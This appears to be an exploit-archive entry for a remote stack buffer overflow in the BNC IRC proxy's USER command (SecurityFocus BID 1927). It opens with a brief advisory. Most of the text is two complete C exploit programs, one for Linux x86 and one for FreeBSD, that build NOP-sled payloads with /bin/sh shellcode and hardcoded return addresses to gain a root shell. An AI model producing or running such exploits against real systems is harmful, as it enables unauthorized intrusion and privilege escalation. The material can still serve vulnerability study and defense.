source : http://www.securityfocus.com/bid/1927/info

BNC's IRC Proxy is used as a gateway to an IRC server.

A buffer stores a username which arguments the program's USER command. User-supplied input to this buffer is improperly checked for length.

As a result, the excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling functions' return address. Since this data is supplied by the user it can be crafted to alter the program's flow of execution. 

If properly exploited, this can yield root privilege to the attacker.

/*

   bnc remote buffer overflow for linux x86 (w/o stack-non-exec patch)
   by duke (duke@viper.net.au)
   works on versions < 2.4.4

  offsets: slackware: 0 redhat: 400->1000
  special thanks to stranJer! :)

  greets to everyone (plaguez, horiz0n, dpr, kod, f1ex, sewid, antilove,
tewl, dmess0r, stranJer  , all of #!ADM :)   and everyone at el8.org )

 */

#include <stdio.h>
#include <string.h>

#define RET 0xbffff814
#define BUFSIZE 2000
#define LEN 1000


char shellcode[] =
"\x33\xdb\x33\xc0\xb0\x29\xcd\x80\x33\xc0\xb0\x29\xcd\x80"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

void
main (int argc, char **argv)
{
  char buf[BUFSIZE];
  int sockfd, i, offset;
  if (argc == 2)
    {
      offset = atoi (argv[1]);
    }
  else
    {
      offset = 0;
    }
  memset (buf, '\x90', BUFSIZE);
  for (i = LEN; i < BUFSIZE - 4; i += 4)
    *(long *) &buf[i] = RET + offset;
  memcpy (buf + (LEN - strlen (shellcode)), shellcode, strlen
(shellcode));
  memcpy (buf, "USER ", 5);
  printf ("%s", buf);
}

----

----obnc_bsd.c by stranJer
/*
   Remote exploit example for bnc (Irc Proxy v2.2.4 by James Seter)
    by duke (duke@viper.net.au)
   32sep98 FreeBSD version by stran9er

   Greet to
!@$@$A#%$#@!D%$#@!$#M@%%$@%c$!@$#!r!%$@e@$!#$#%w$@#$@#!!!#@$#$%
*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>

#define ADDR  0xefbfd907
#define RETPTR      1036
#define BUFSIZE     1041
#define SHELLOFFSET   23

char shellcode[] =
/* added by me dup(0);dup(0) */
  "\xEB\x0B\\\x9Axxx\\\x07x\xC3\xEB\x05\xE8\xF9\377\377\377"
  "\x5E\x33\xDb\x89\x5e\xF2\x88\x5e\xF7\x31\xC0\xB0\x29\x53"
  "\xE8\xDE\xFF\xFF\xFF\x33\xC0\xB0\x29\xE8\xD5\xFF\xFF\xFF"
/* generic shellcode */
  "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
  "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
  "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
  "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

void main (int argc, char **argv)
{
  char buf[BUFSIZE+5];
  unsigned long int addr = ADDR;
  int i;

  if (argc > 1) addr += atoi (argv[1]);
  fprintf (stderr, "Using address: 0x%X\n", addr);

  memset (buf, 0x90, BUFSIZE);
  for (i = RETPTR; i < BUFSIZE - 4; i += 4)
    *(long *) &buf[i] = addr;
  memcpy (buf + (RETPTR - sizeof(shellcode)) - SHELLOFFSET,
    shellcode, strlen (shellcode));
  buf[BUFSIZE]=0;
  printf ("%s/usr/bin/uname -a\n/usr/bin/id\n/bin/pwd\n", buf);
}
/* segodna: 23 sentabra 1998 goda */